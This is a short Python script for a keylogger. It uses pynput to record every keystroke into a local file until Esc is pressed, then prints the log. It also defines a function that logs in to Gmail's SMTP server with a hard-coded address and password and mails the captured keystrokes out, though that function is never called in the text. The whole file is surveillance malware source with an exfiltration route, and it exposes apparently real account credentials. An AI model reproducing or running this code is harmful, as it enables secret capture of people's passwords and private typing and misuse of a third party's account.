from pynput import keyboard
import smtplib,ssl

def write(text):
    with open("keylogger.txt",'a') as f:
        f.write(text)
        f.close()


def on_key_press(Key):
    try:
        if(Key == keyboard.Key.enter):
            write("\n")
        else:
            write(Key.char)
    except AttributeError:
        if Key == keyboard.Key.backspace:
            write("\nBackspace Pressed\n")
        elif(Key == keyboard.Key.tab):
            write("\nTab Pressed\n")
        elif(Key == keyboard.Key.space):
            write(" ");
        else:
            temp = repr(Key)+" Pressed.\n"
            write(temp)
            print("\n{} Pressed\n".format(Key))

def on_key_release(Key):
    if(Key == keyboard.Key.esc):
        return False

with keyboard.Listener(on_press= on_key_press,on_release= on_key_release) as listener:
    listener.join()

message = ""
with open("keylogger.txt",'r') as f:
    temp = f.read()
    message = str(temp)
    f.close()
print(message)
import smtplib

def mail(message):
    server = smtplib.SMTP_SSL("smtp.gmail.com",465)
    server.login("mailt3164@gmail.com","Shyam@2001")
    server.sendmail("mailt3164@gmail.com","mailt3164@gmail.com",message)
    server.quit()
